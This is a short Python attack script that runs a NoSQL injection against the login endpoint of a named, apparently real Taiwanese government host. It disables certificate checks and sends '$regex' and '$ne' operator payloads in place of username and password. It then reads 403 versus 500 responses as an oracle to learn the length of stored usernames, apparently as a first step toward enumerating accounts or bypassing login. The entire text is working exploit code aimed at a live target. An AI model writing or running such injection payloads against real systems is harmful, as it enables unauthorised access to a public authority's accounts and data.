import requests, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    r=s.post(BASE+"/login", json=body, timeout=10)
    return r.status_code

print("=== 用户名长度 oracle: $regex 精确长度 ===")
print("逻辑: 若'恰好N个字符的用户名' 文档数 >=2 -> 403, 否则 500")
for n in range(3,20):
    body={"username":{"$regex":f"^.{n}$"},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    sc=login(body); time.sleep(0.05)
    flag=" <== 多文档!" if sc==403 else ""
    print(f"  len=={n:2d} -> {sc}{flag}")
